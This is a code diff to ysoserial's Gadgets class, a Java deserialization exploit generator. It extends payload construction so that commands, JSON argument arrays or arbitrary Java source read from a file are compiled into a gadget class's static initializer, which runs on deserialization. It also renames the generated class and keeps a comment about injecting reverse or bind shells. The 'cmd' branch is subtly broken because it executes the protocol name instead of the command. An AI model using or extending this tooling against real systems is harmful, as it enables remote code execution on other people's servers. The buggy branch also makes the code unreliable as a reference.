@@ -3,16 +3,24 @@ package ysoserial.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
+
 import java.io.Serializable;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.Map;
 
+import com.google.gson.Gson;
+import com.google.gson.JsonElement;
+import com.google.gson.JsonParser;
 import com.nqzero.permit.Permit;
+import elemental.json.Json;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -114,12 +122,50 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-            "\");";
-        clazz.makeClassInitializer().insertAfter(cmd);
+
+        String[] payload_list = command.split("://", 2);
+        StringBuilder final_java_code = new StringBuilder();
+
+        if (payload_list.length == 1) {
+            final_java_code = new StringBuilder("java.lang.Runtime.getRuntime().exec(\"" +
+                payload_list[0].replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
+                "\");");
+        } else {
+            String protocol = payload_list[0];
+            String payload = payload_list[1];
+            switch (protocol.toLowerCase()) {
+                case "file":
+                    final_java_code = new StringBuilder(new String(Files.readAllBytes(Paths.get(payload))));
+                    break;
+                case "cmd":
+                    final_java_code = new StringBuilder("java.lang.Runtime.getRuntime().exec(\"" +
+                        payload_list[0].replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
+                        "\");");
+                    break;
+                case "cmds":
+                    JsonParser parser = new JsonParser();
+                    JsonElement elements = parser.parse(payload);
+                    if (elements.isJsonArray()) {
+                        final_java_code = new StringBuilder("java.lang.Runtime.getRuntime().exec(new String[]{");
+                        for (JsonElement element : elements.getAsJsonArray()) {
+                            final_java_code.append("\"");
+                            //System.out.println(element.getAsString());
+                            final_java_code.append(element.getAsString().replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\""));
+                            final_java_code.append("\",");
+                        }
+                        final_java_code.deleteCharAt(final_java_code.length() - 1);
+                        final_java_code.append("});");
+                    } else {
+                        System.out.println("Abort! Only support json array.");
+                        System.exit(-1);
+                    }
+                    break;
+            }
+        }
+        //System.out.println(final_java_code.toString());
+        clazz.makeClassInitializer().insertAfter(final_java_code.toString());
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
+        clazz.setName("notsoserial.qaq" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
         clazz.setSuperclass(superC);
 
